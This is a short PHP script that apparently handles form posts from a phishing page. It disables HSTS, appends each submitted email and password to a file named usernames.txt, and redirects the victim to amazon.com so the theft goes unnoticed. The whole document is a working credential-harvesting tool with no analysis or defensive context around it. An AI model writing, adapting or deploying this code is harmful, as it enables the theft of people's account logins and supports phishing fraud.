<?php
header( 'Strict-Transport-Security: max-age=0;' );
file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.amazon.com');
exit();
